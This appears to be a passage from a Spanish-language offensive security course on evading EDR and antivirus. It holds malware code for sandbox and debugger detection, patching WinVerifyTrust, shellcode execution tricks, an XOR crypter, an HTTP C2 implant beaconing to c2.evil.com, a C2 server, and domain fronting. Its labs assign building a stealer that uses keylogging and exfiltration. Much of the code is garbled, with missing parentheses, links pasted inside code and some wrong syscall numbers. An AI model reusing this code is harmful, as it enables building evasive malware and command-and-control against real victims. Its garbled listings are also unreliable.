SpoofedEntry PROC ; Push a fake return address lea rax, FakeFunction push rax ; Now the real shellcode address push rcx ; shellcode address ; Execute shellcode ret
SpoofedEntry ENDP

END
```

### 9.5 Delay Execution

Tecnicas para retrasar la ejecucion y evadir sandboxes:

```c
// Delay Execution Techniques
#include <windows.h>
#include <stdio.h>

void DelayExecution { // 1. Sleep simple Sleep(5000); // 2. Sleep con GetTickCount para evitar deteccion de Sleep skip DWORD start = GetTickCount; while (GetTickCount - start < 5000) { // Hacer algo que consuma tiempo for (int i = 0; i < 1000; i++) { __nop; } } // 3. WaitForSingleObject con timeout HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); WaitForSingleObject(hEvent, 5000); CloseHandle(hEvent); // 4. Calculos intensivos (CPU-bound loop) volatile DWORD sum = 0; for (DWORD i = 0; i < 100000000; i++) { sum += i; } // 5. QueryPerformanceCounter LARGE_INTEGER freq, startTime, endTime; QueryPerformanceFrequency(&freq); QueryPerformanceCounter(&startTime); do { QueryPerformanceCounter(&endTime); } while (endTime.QuadPart - startTime.QuadPart) < (freq.QuadPart * 5); // 5 segundos
}

// Delay evasivo - chequea que no haya debugger
void SmartDelay { // Checkear si estamos siendo debuggeados antes del delay if (IsDebuggerPresent) { // Si hay debugger, no hacer delay (es una sandbox!) return; } // Si no hay debugger, hacer delay real con chequeos for (int i = 0; i < 10; i++) { Sleep(1000); if (GetTickCount == GetTickCount - 1000) { // Sleep esta siendo manipulado! ejecutar de todas formas break; } }
}

int main { printf("=== Delay Execution Techniques ===\n\n"); printf("Ejecutando delay evasion..\n"); DelayExecution; printf("Delay completado!\n"); return 0;
}
```

### 9.7 Environmental Keying

Solo ejecutar shellcode si el entorno es el correcto (evitar sandboxes):

```c
// Environmental Keying
#include <windows.h>
#include <stdio.h>

BOOL CheckEnvironment { // 1. Verificar que no sea una VM // usando CPUID int cpuInfo[4] = {0}; __cpuid(cpuInfo, 1); // Verificar hypervisor bit (bit 31 de ECX) if (cpuInfo[2] & (1 << 31) { printf("[!] Hypervisor detectado! Posible VM\n"); return FALSE; } // 2. Verificar cantidad de RAM MEMORYSTATUSEX memInfo; memInfo.dwLength = sizeof(MEMORYSTATUSEX); GlobalMemoryStatusEx(&memInfo); if (memInfo.ullTotalPhys < 4LL * 1024LL * 1024LL * 1024LL) { printf("[!] Menos de 4GB de RAM - posible sandbox\n"); return FALSE; } // 3. Verificar nombre de usuario char username[256]; DWORD usernameLen = sizeof(username); GetUserNameA(username, &usernameLen); // Evitar usuarios de sandbox comunes if (strcmp(username, "sandbox") == 0 || strcmp(username, "malware") == 0 || strcmp(username, "virus") == 0 || strcmp(username, "analysis") == 0) { printf("[!] Usuario sospechoso: %s\n", username); return FALSE; } // 4. Verificar nombre del equipo char computerName[256]; DWORD computerNameLen = sizeof(computerName); GetComputerNameA(computerName, &computerNameLen); if (strstr(computerName, "SANDBOX") || strstr(computerName, "ANALYSIS") || strstr(computerName, "VIRUS") { printf("[!] Nombre de equipo sospechoso\n"); return FALSE; } // 5. Verificar uptime del sistema DWORD uptime = GetTickCount / 1000 / 60; // en minutos if (uptime < 30) { printf("[!] Sistema con menos de 30 min de uptime - posible sandbox\n"); return FALSE; } // 6. Verificar procesos comunes de analisis HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)}; const char* analysisTools = { "procmon.exe", "processhacker.exe", "[wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark).exe", "tcpview.exe", "fiddler.exe", "ida.exe", "x64dbg.exe", "ollydbg.exe", "windbg.exe", "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe" }; if (Process32First(hSnapshot, &pe) { do { _strlwr(pe.szExeFile); for (int i = 0; i < sizeof(analysisTools)/sizeof(analysisTools[0]); i++) { if (strcmp(pe.szExeFile, analysisTools[i]) == 0) { printf("[!] Herramienta de analisis detectada: %s\n", pe.szExeFile); CloseHandle(hSnapshot); return FALSE; } } } while (Process32Next(hSnapshot, &pe); } CloseHandle(hSnapshot); return TRUE;
}

int main { printf("=== Environmental Keying Demo ===\n\n"); if (CheckEnvironment) { printf("[+] Entorno parece seguro! Ejecutando [payload](../raw/m3t4spl01t.md#payloads)..\n"); // Ejecutar shellcode } else { printf("[-] Entorno sospechoso! Abortando..\n"); // Salir sin ejecutar } return 0;
}
```

### 9.9 Ejercicio Practico: Obfuscacion

**Escenario:** Tu loader es detectado por firma estatica.

**Tarea:** Ofuscar el loader para evadir deteccion estatica.

**Pistas:**
1. Ofusca todos los strings con XOR.
2. Implementa API hashing para resolver funciones.
3. Agrega environmental keying para evadir sandboxes.
4. Agrega delay execution con chequeo de debugger.
5. Compila y prueba con Windows Defender.

---

## 10. Signature Evasion

### 10.1 Firma Digital y Certificados

Windows verifica firmas digitales en los ejecutables. Los EDRs pueden bloquear binarios no firmados.

```bash
# Verificar firma de un binario
signtool verify /pa /v archivo.exe

# Herramientas de firma
# - signtool.exe (Windows SDK)
# - ossl)signcode (OpenSSL)
# - MinGW signtool alternativas
```

### 10.2 Signing Cert Abuse

Usar certificados robados o extendidos para firmar malware:

```bash
# Firmar con certificado robado
signtool sign /fd SHA256 /a /f certificado.pfx /p contraseña archivo.exe

# Firmar con timestamp
signtool sign /fd SHA256 /tr [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://timestamp.digicert.[com](../raw/w1n-s9bsyst3ms.md#com) /td SHA256 archivo.exe

# Verificar firma
signtool verify /pa /v archivo.exe
```

### 10.5 Signature Verification Bypass

```c
// Bypass de verificacion de firma
#include <windows.h>

BOOL BypassSignatureCheck { // Parchear WinVerifyTrust en memoria HMODULE hWintrust = LoadLibraryA("wintrust.dll"); if (!hWintrust) return FALSE; LPVOID winVerifyTrust = GetProcAddress(hWintrust, "WinVerifyTrust"); if (!winVerifyTrust) return FALSE; // Hacer que WinVerifyTrust siempre retorne 0 (success) DWORD oldProtect; VirtualProtect(winVerifyTrust, 5, PAGE_EXECUTE_READWRITE, &oldProtect); // xor eax, eax; ret (8 bytes en x64) BYTE patch = { 0x48, 0x33, 0xC0, 0xC3 }; memcpy(winVerifyTrust, patch, sizeof(patch); VirtualProtect(winVerifyTrust, 5, oldProtect, &oldProtect); return TRUE;
}
```

### 10.6 Ejercicio Practico: Signature Evasion

**Escenario:** Necesitas que tu binario pase la verificacion de firma de Windows.

**Tarea:** Firmar el binario con un certificado (puede ser self-signed para pruebas).

---

## 11. C2 Integration

### 11.2 Custom Implant Communication

```c
// http_implant.c - Implant que se comunica via HTTP
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

BOOL SendBeacon(LPCSTR server, int port, LPCSTR path, LPCSTR data) { HINTERNET hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_proxy, NULL, NULL, 0); if (!hSession) return FALSE; HINTERNET hConnect = WinHttpConnect(hSession, L"", port, 0); if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; } // Convertir a wide WCHAR wPath[256]; MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, 256); HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath, NULL, NULL, NULL, 0); if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; } // Enviar POST BOOL result = WinhttpsendRequest(hRequest, L"Content-Type: application/json\r\n", -1, (LPVOID)data, strlen(data), strlen(data), 0); if (result) { WinHttpReceiveResponse(hRequest, NULL); // Leer respuesta char buffer[4096]; DWORD bytesRead; WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead); } WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result;
}

int main { printf("=== [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) HTTP Implant ===\n\n"); // Beacon cada X segundos while (1) { SendBeacon("[c2](../raw/r3v3rs3-sh3lls.md#command-and-control).evil.com", 443, "/beacon", "{\"id\":\"1234\",\"status\":\"ok\"}"); // Recibir comandos y ejecutarlos // .. Sleep(60000); // 1 minuto } return 0;
}
```

### 11.5 Implementacion de un C2 basico

```python
# C2_Server.py - Servidor C2 simple
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import base64

class C2Handler(BaseHTTPRequestHandler): def do_POST(self): content_length = int(self.headers['Content-Length']) post_data = self.rfile.read(content_length) data = json.loads(post_data) print(f"[+] Beacon recibido de {data.get('id', 'unknown')}") print(f"[+] Data: {data}") # [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) con comandos response = { 'action': 'exec', 'command': 'whoami', 'id': data.get('id', '') } self.send_response(200) self.send_header('Content-Type', 'application/json') self.end_headers self.wfile.write(json.dumps(response).encode) def do_GET(self): self.send_response(404) self.end_headers

def main: server = HTTPServer('0.0.0.0', 443), C2Handler) print("[*] C2 Server corriendo en 0.0.0.0:443") try: server.serve_forever except KeyboardInterrupt: print("\n[!] Servidor detenido") server.server_close

if __name__ == '__main__': main
```

---

## 12. Laboratorios y Ejercicios Finales

### 12.1 Laboratorio 1: Defender Evasion

**Escenario:** Crear un payload que evada Windows Defender en tiempo real.

**Requerimientos:**
1. Usar direct syscalls (Hell's Gate o SysWhispers2)
2. Ofuscar strings (XOR + stack strings)
3. API hashing para resolver funciones
4. Environmental keying
5. Delay execution de 30 segundos

**Evaluacion:**
- El binario no debe ser detectado por Defender
- Debe ejecutar shellcode de calc.exe

### 12.2 Laboratorio 2: CrowdStrike Bypass

**Escenario:** Simular evasion de CrowdStrike Falcon.

**Requerimientos:**
1. API unhooking de ntdll.dll
2. Indirect syscalls
3. Call stack spoofing
4. ETW patching

### 12.3 Laboratorio 3: Custom Malware Development

**Escenario:** Crear un stealer completo que exfiltre datos via HTTP.

**Componentes:**
1. Loader con direct syscalls
2. C2 communication via HTTPS
3. Persistencia via Run key
4. Keylogging
5. Screenshot capture

---

## 13. Apendices

### 13.2 Syscall Numbers Table (Windows 10 22H2 x64)

| Syscall | Number | Funcion |
|---------|--------|---------|
| NtAllocateVirtualMemory | 0x18 | Asignar memoria virtual |
| NtFreeVirtualMemory | 0x1E | Liberar memoria virtual |
| NtProtectVirtualMemory | 0x50 | Cambiar proteccion de memoria |
| NtWriteVirtualMemory | 0x3A | Escribir en memoria remota |
| NtReadVirtualMemory | 0x3F | Leer memoria remota |
| NtCreateThreadEx | 0xC7 | Crear thread |
| NtOpenProcess | 0x26 | Abrir proceso |
| NtOpenThread | 0x64 | Abrir thread |
| NtCreateFile | 0x55 | Crear/abrir archivo |
| NtReadFile | 0x3F | Leer archivo |
| NtWriteFile | 0x3A | Escribir archivo |
| NtCreateProcess | 0xAA | Crear proceso |
| NtCreateUserProcess | 0xC5 | Crear proceso de usuario |
| NtResumeThread | 0x52 | Reanudar thread |
| NtSuspendThread | 0x53 | Suspender thread |
| NtQueueApcThread | 0x43 | Encolar APC |
| NtSetContextThread | 0x5C | Setear contexto de thread |
| NtGetContextThread | 0x5D | Obtener contexto de thread |
| NtClose | 0x0F | Cerrar handle |
| NtOpenKey | 0x0F | Abrir clave de registro |
| NtQueryInformationProcess | 0x19 | Query info de proceso |

### 13.3 API Hashing Algorithms

```c
// DJB2 Hash
DWORD djb2(const char* str) { DWORD hash = 5381; int c; while (c = *str++) hash = (hash << 5) + hash) + c; return hash;
}

// CRC32
DWORD crc32(const char* str) { DWORD hash = 0xFFFFFFFF; int c; while (c = *str++) { hash ^= c; for (int i = 0; i < 8; i++) hash = (hash & 1) ? (hash >> 1) ^ 0xEDB88320 : hash >> 1; } return ~hash;
}

// MurmurHash2
DWORD murmur2(const char* str, DWORD len, DWORD seed) { DWORD h = seed ^ len; const DWORD m = 0x5BD1E995; while (len >= 4) { DWORD k = *(DWORD*)str; k *= m; k ^= k >> 24; k *= m; h *= m; h ^= k; str += 4; len -= 4; } // Handle remaining bytes return h;
}
```

### 13.4 Herramientas y Recursos

**Herramientas de desarrollo y evasion:**
- Visual Studio / MSVC: Compilador C/C++
- Mingw-w64: Toolchain GCC para Windows
- NASM/YASM: Ensambladores
- SysWhispers2/3: Generacion de syscalls
- Donut: Convertir .NET a shellcode
- PEzor: Empaquetador PE
- NimCrypt: Ofuscador Nim
- ScareCrow: Loader con bypass de EDR
- TitanHide: Bypass de hooks

**Herramientas de analisis:**
- x64dbg: Debugger
- IDA Pro / Ghidra: Disassembler
- Process Hacker 2: Visualizador de procesos
- API Monitor: Monitoreo de APIs
- PE-Bear: Editor de PE
- Detect It Easy (DiE): Detector de packers
- Capa: Detector de capacidades
- FLOSS: Extraccion de strings ofuscados

**Recursos de aprendizaje:**
- VX Underground: Papers y malware samples
- Zero2Auto: Curso de malware analysis
- Sektor7: Cursos de evasion
- RastaMouse: Blog de EDR evasion
- SpecterOps: Blog de offensive security

**Laboratorios online:**
- TryHackMe: Sala de malware analysis
- HackTheBox: Maquinas de evasion
- Rootme: Challenges de reversing ### 8.11 Tecnicas Avanzadas de Ejecucion (continuacion)

**Ejecucion via Timers (SetTimer):**
```c
// Ejecutar shellcode via SetTimer + callback
void CALLBACK TimerProc(HWND hwnd, UINT msg, UINT_PTR id, DWORD time) { (void(*)id);
}

void ExecuteWithSetTimer(LPVOID shellcode) { // SetTimer con el shellcode como callback UINT_PTR timerId = (UINT_PTR)shellcode; SetTimer(NULL, timerId, 0, TimerProc); // Loop de mensajes para que se dispare el timer MSG msg; while (GetMessage(&msg, NULL, 0, 0) { TranslateMessage(&msg); DispatchMessage(&msg); }
}
```

**Ejecucion via Windows Hooks:**
```c
// SetwindowsHookEx con shellcode
HHOOK SetHook(LPVOID shellcode) { // Usar SetWindowsHookEx con el shellcode como hook proc return SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)shellcode, GetModuleHandle(NULL), 0);
}
```

### 9.6 Entropy Reduction

Reducir la entropia del binario para evitar deteccion por ML:

```c
// Tecnicas para reducir entropia
// 1. Rellenar con bytes de baja entropia (0x00, 0xFF, patrones repetitivos)
// 2. Usar compresion en vez de [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) para ofuscar
// 3. Dividir el shellcode en chunks mezclados con datos innocuos

void ReduceEntropy(BYTE* data, SIZE_T size) { // Ejemplo: intercalar bytes de shellcode con bytes padding BYTE* padded = malloc(size * 2); for (SIZE_T i = 0; i < size; i++) { padded[i * 2] = data[i]; padded[i * 2 + 1] = 0x00; // byte de baja entropia } // reconstruir en runtime omitiendo los padding bytes
}
```

### 10.3 Packers vs Crypters

**Packers comunes:**
- UPX (Ultimate Packer for Executables)
- MPRESS
- ASPack
- Themida
- VMProtect

```bash
# UPX packer
upx --best --ultra-brute malware.exe -o malware_packed.exe

# MPRESS
mpress malware.exe

# Desventajas: Los packers son detectados por firma
# Los EDRs modernos detectan UPX facilmente
```

**Crypter custom:**
```python
# crypter.py - Ofuscador simple
import random
import sys

def xor_encrypt(data, key): return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def generate_stub(encrypted_data, key): stub = '''#include <windows.h>
#include <stdio.h>

unsigned char encrypted = {%s};
unsigned char key = {%s};

int main { for (int i = 0; i < sizeof(encrypted); i++) { encrypted[i] ^= key[i %% %d]; } LPVOID exec = VirtualAlloc(NULL, sizeof(encrypted), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, encrypted, sizeof(encrypted); (void(*)exec); return 0;
}''' % ( ','.join(f'0x{b:02x}' for b in encrypted_data), ','.join(f'0x{b:02x}' for b in key), len(key) ) return stub

def main: with open('payload.bin', 'rb') as f: payload = f.read key = bytes([random.randint(0,255) for _ in range(16)]) encrypted = xor_encrypt(payload, key) stub = generate_stub(encrypted, key) with open('stub.c', 'w') as f: f.write(stub) print(f"[+] Stub generado: stub.c") print(f"[+] Payload ofuscado con XOR (key length: {len(key)})")

if __name__ == '__main__': main
```

### 11.3 Domain Fronting

Domain fronting usa CDNs para ocultar el destino real del trafico C2:

```c
// [domain fronting](../raw/r3d-t34m-1nfr4.md#domain-fronting) via cloudflare
BOOL DomainFrontingBeacon { HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0); // Usar un dominio CDN (Cloudflare, Akamai, etc.) // El Host header va al front (CDN valida el host) // El request va al backend con el header X-Host real HINTERNET hConnect = WinHttpConnect(hSession, L"cloudflare-front.com", 443, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/beacon", NULL, L"cloudflare-front.com", NULL, 0); // Agregar header con el backend real LPCWSTR headers = L"X-Host: c2-backend.evil.com\r\n" L"Content-Type: application/json\r\n"; WinHttpSendRequest(hRequest, headers, -1, data, len, len, 0); // El CDN reenvia a c2-backend.evil.com // Los firewalls ven solo cloudflare-front.com WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return TRUE;
}
```

### 11.4 C2 Profile Rotation

Rotar perfiles C2 para evadir deteccion basada en IOCs:

```c
typedef struct { char* userAgent; char* beaconPath; char* sleepjitter; int sleepTime;
} C2_PROFILE;

C2_PROFILE profiles = { {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "/api/v2/analytics", "0.2", 60000}, {"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)", "/wp-content/themes/theme/ajax.php", "0.3", 45000}, {"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "/js/analytics.min.js", "0.15", 75000},
};

void RandomizeProfile { int idx = rand % (sizeof(profiles) / sizeof(C2_PROFILE); C2_PROFILE* profile = &profiles[idx]; // Aplicar nuevo perfil UpdateUserAgent(profile->userAgent); UpdatebeaconPath(profile->beaconPath); UpdateSleepTime(profile->sleepTime, profile->sleepJitter);
}
```

### 12.1 Laboratorio Avanzado: EDR Evasion Toolkit

**Objetivo:** Crear un toolkit completo de evasion que combine todas las tecnicas.

```c
// edr_evasion_toolkit.c - Version resumida
#include <windows.h>
#include <stdio.h>

// 1. API Unhooking
void UnhookNtdll { /* .. */ }

// 2. Direct Syscall via Hell's Gate
DWORD GetSyscallNumber(const char* func) { /* .. */ }

// 3. [[amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass)](./raw/3dr
void PatchAmsi { /* .. */ }

// 4. [etw](../raw/3dr-3v4s10n.md#etw) Bypass
void PatchEtw { /* .. */ }

// 5. Environmental Keying
BOOL CheckEnvironment { /* .. */ }

// 6. Delay Execution
void EvasiveDelay { /* .. */ }

int main { printf("[*] Inicializando toolkit de evasion..\n"); if (!CheckEnvironment) { printf("[!] Entorno hostil, saliendo..\n"); return 1; } EvasiveDelay; printf("[*] Aplicando API Unhooking..\n"); UnhookNtdll; printf("[*] Parcheando [amsi](../raw/3dr-3v4s10n.md#amsi)..\n"); PatchAmsi; printf("[*] Parcheando ETW..\n"); PatchEtw; printf("[+] Entorno preparado. Ejecutando payload..\n"); // Obtener syscall numbers DWORD scNtAllocate = GetSyscallNumber("NtAllocateVirtualMemory"); DWORD scNtWrite = GetSyscallNumber("NtWriteVirtualMemory"); DWORD scNtProtect = GetSyscallNumber("NtProtectVirtualMemory"); // Ejecutar shellcode usando direct syscalls // .. return 0;
}
```

### 13.1 Windows Internals Reference

**Estructura del PEB (Process Environment Block):**
```
PEB (64-bit):
+0x000 Reserved1 : [2] Uint8B
+0x010 BeingDebugged : Uint8B (1 si debuggeado)
+0x018 ImageBaseAddress : Ptr64 Void (base del modulo principal)
+0x020 Ldr : Ptr64 _PEB_LDR_DATA (datos del loader)
+0x030 ProcessParameters  : Ptr64 _RTL_USER_PROCESS_PARAMETERS
+0x068 SessionId : Uint4B (sesion de Terminal Services)
```

**Estructura del TEB (Thread Environment Block):**
```
[teb](../raw/w1n-1nt3rn4ls.md#teb) (64-bit):
+0x00000 Reserved1 : [3] Ptr64 Void
+0x00018 Reserved2 : Ptr64 Void
+0x00020 ReservationStack : [1] Ptr64 Void
+0x00028 StackBase : Ptr64 Void (base del stack)
+0x00030 StackLimit : Ptr64 Void (limite del stack)
+0x00038 SubProcessTag : Ptr64 Void
+0x00040 FiberData : Ptr64 Void
+0x00048 Version : Uint8B
+0x00050 ArbitraryUserPtr : Ptr64 Void
+0x00058 TlsSlots : [64] Ptr64 Void ([tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) array)
+0x002B0 DeallocationStack : Ptr64 Void
```

**Procesos clave de Windows:**
```
System (PID 4): Proceso del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) (ntoskrnl.exe)
smss.exe: Session Manager Subsystem
csrss.exe: Client Server Runtime Process
wininit.exe: Windows Initialization
services.exe: Service Control Manager
lsass.exe: Local Security Authority ([mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) target!)
svchost.exe: Service Host (multiples instancias)
explorer.exe: Windows Explorer
```

**DLLs criticos:**
```
ntdll.dll: Native API (syscalls, heap, loader)
kernel32.dll: Kernel API base
kernelbase.dll: Kernel API moderna
advapi32.dll: Registry, services, security
user32.dll: Window management, messages
gdi32.dll: Graphics
wininet.dll: WinHTTP/WinINet (internet)
ws2_32.dll: Winsock ([tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip))
crypt32.dll: [cryptography](../raw/crypt0-f0r-h4ck3rs.md)
amsi.dll: Antimalware Scan Interface
```

**APIs de depuracion:**
```
IsDebuggerPresent: Detecta debugger
CheckRemoteDebuggerPresent: Detecta debugger remoto
NtQueryInformationProcess(ProcessDebugport): [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) de debug
NtQueryInformationProcess(ProcessDebugObjectHandle): Objeto de debug
NtQueryInformationProcess(ProcessDebugFlags): Flags de debug
NtSetInformationThread(ThreadHideFromDebugger): Esconderse de debugger
OutputDebugString: Generar evento de debug (si falla, hay debugger)
```

**Estructura de un syscall en x64:**
```asm
; Antes de la syscall:
mov r10, rcx ; RCX se pierde despues de la syscall por la instruccion SYSCALL ; El kernel guarda RSP en LSTAR MSR y pone el SSDT en RCX ; Entonces movemos RCX a R10 para preservar el primer argumento
mov eax, SSDT_NUM ; Numero de syscall en el System Service Dispatch Table
syscall ; La instruccion SYSCALL: ; 1. Copia RIP a RCX (para el return) ; 2. Copia RFLAGS a R11 ; 3. Salta al handler (de LSTAR MSR -> KiSystemCall64) ; 4. Cambia a Ring 0
ret ; Vuelve al usuario (la syscall termina con ret)
```

**Estructura del SSDT (System Service Descriptor Table):**
```
SSDT es una tabla en el kernel que mapea numeros de syscall a direcciones de funciones.
Cada entrada es un [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) de 8 bytes (x64) a la funcion del kernel.
La tabla KeServiceDescriptorTable contiene 4 SSDT (nativos, win32k, etc).

Syscall # -> SSDT[#] -> Ptr -> Funcion del kernel

Ejemplo:
NtAllocateVirtualMemory (SSDT #0x18) -> nt!NtAllocateVirtualMemory
NtCreateThreadEx (SSDT #0xC7) -> nt!NtCreateThreadEx
```

**Shadow SSDT:**
```
Ademas del SSDT principal, existe el Shadow SSDT (win32k.sys).
Contiene syscalls de GUI (NtUser*, NtGdi*).
Usado para deteccion de keyloggers, hooks de mensajes, etc.
No accesible desde Ring 3 directamente.

